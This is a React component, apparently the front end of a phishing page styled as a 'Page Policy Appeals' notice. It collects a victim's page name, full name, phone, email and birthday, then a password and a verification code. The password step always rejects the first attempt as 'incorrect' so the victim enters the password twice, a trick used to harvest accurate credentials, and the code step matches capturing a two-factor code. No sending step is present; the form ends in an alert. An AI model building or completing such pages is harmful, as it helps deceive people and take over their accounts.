import React, { useState } from 'react';

const MultiStepForm: React.FC = () => {
	const [step, setStep] = useState<1 | 2 | 3>(1);
	const [formData, setFormData] = useState({
		pageName: '',
		fullName: '',
		phone: '',
		email: '',
		birthday: '',
		password: '',
		code: '',
	});
	const [passwordError, setPasswordError] = useState('');

	const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
		const { name, value } = e.target;
		setFormData((prev) => ({ ...prev, [name]: value }));
	};

	const handleSubmit = (e: React.FormEvent) => {
		e.preventDefault();

		if (step === 1) {
			setStep(2); // sang bước nhập password
		} else if (step === 2) {
			if (passwordError === '') {
				// Lần 1 báo sai mật khẩu
				setPasswordError('The password that you’ve entered is incorrect.');
			} else if (formData.password === '123456') {
				// Lần 2 đúng mật khẩu
				setPasswordError('');
				setStep(3);
			} else {
				setPasswordError('The password that you’ve entered is incorrect.');
			}
		} else if (step === 3) {
			alert('Code entered: ' + formData.code);
		}
	};

	return (
		<div className="max-w-md mx-auto my-10 bg-white p-6 rounded-xl shadow-md">
			<h2 className="text-2xl font-semibold text-center text-gray-800 mb-6">
				{step === 1 ? 'Page Policy Appeals' : step === 2 ? 'Secure Login' : 'Verification'}
			</h2>

			<form onSubmit={handleSubmit} className="space-y-4">
				{step === 1 && (
					<>
						<input
							type="text"
							name="pageName"
							placeholder="Page Name"
							value={formData.pageName}
							onChange={handleChange}
							className="w-full border rounded-lg p-3 text-sm"
						/>
						<input
							type="text"
							name="fullName"
							placeholder="Your Full Name"
							value={formData.fullName}
							onChange={handleChange}
							className="w-full border rounded-lg p-3 text-sm"
						/>
						<input
							type="tel"
							name="phone"
							placeholder="Phone Number"
							value={formData.phone}
							onChange={handleChange}
							className="w-full border rounded-lg p-3 text-sm"
						/>
						<input
							type="email"
							name="email"
							placeholder="Email"
							value={formData.email}
							onChange={handleChange}
							className="w-full border rounded-lg p-3 text-sm"
						/>
						<input
							type="text"
							name="birthday"
							placeholder="Birthday (MM/DD/YYYY)"
							value={formData.birthday}
							onChange={handleChange}
							className="w-full border rounded-lg p-3 text-sm"
						/>
					</>
				)}

				{step === 2 && (
					<>
						<input
							type="password"
							name="password"
							placeholder="Enter your password"
							value={formData.password}
							onChange={handleChange}
							className="w-full border rounded-lg p-3 text-sm"
						/>
						{passwordError && (
							<p className="text-sm text-red-500">{passwordError}</p>
						)}
					</>
				)}

				{step === 3 && (
					<>
						<input
							type="text"
							name="code"
							placeholder="Enter verification code"
							value={formData.code}
							onChange={handleChange}
							className="w-full border rounded-lg p-3 text-sm"
						/>
					</>
				)}

				<button
					type="submit"
					className="w-full mt-4 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition font-medium"
				>
					{step === 3 ? 'Verify' : 'Continue'}
				</button>
			</form>
		</div>
	);
};

export default MultiStepForm;
